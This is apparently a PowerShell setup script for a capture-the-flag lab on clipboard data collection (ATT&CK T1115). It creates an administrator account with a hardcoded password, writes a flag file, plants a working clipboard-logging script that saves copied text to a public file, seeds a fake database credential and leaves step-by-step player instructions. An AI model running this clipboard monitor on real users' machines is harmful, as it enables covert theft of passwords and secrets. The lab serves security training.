#Requires -RunAsAdministrator
$PlayerUsr = "player"; $PlayerPwd = ConvertTo-SecureString "Player@123!" -AsPlainText -Force
$FlagPath  = "C:\Windows\System32\flag_T1115.txt"
$Flag      = "HACKTIFY{CLIPBOARD_COLLECTION_$($env:COMPUTERNAME)}"
if (-not (Get-LocalUser $PlayerUsr -EA SilentlyContinue)) {
    New-LocalUser $PlayerUsr -Password $PlayerPwd -FullName "Player" -PasswordNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $PlayerUsr }
Set-Content $FlagPath $Flag
$acl = Get-Acl $FlagPath; $acl.SetAccessRuleProtection($true,$false)
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators","FullControl","Allow")))
Set-Acl $FlagPath $acl
# Create clipboard monitor script
@'
Add-Type -AssemblyName System.Windows.Forms
$outFile = "C:\Users\Public\clipboard_log.txt"
"[*] Clipboard monitor started: $(Get-Date)" | Tee-Object $outFile
$prev = ""
$count = 0
while ($count -lt 30) {
    $current = [System.Windows.Forms.Clipboard]::GetText()
    if ($current -and $current -ne $prev) {
        $entry = "[$(Get-Date -Format HH:mm:ss)] $current"
        $entry | Tee-Object $outFile -Append
        $prev = $current
    }
    Start-Sleep 2
    $count++
}
"[*] Monitor ended. Log: $outFile" | Write-Host
'@ | Set-Content "C:\ProgramData\clip_monitor.ps1"
# Pre-populate clipboard with something interesting for demo
Set-Clipboard -Value "Server: db01.corp.local | User: sa | Password: SQL@Prod2024!"
Set-Content "C:\Users\Public\Desktop\README.txt" @"
=== T1115 Clipboard Data Collection ===
Login   : $PlayerUsr / Player@123!
Goal    : Capture sensitive data copied to the clipboard by users.
Step 1 : Read current clipboard: Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()
Step 2 : Start clipboard monitor: powershell -File C:\ProgramData\clip_monitor.ps1
Step 3 : While monitor runs, paste different sensitive values into the clipboard
Step 4 : Read log: type C:\Users\Public\clipboard_log.txt
Flag   : type $FlagPath
"@
Write-Host "[+] T1115 setup complete."
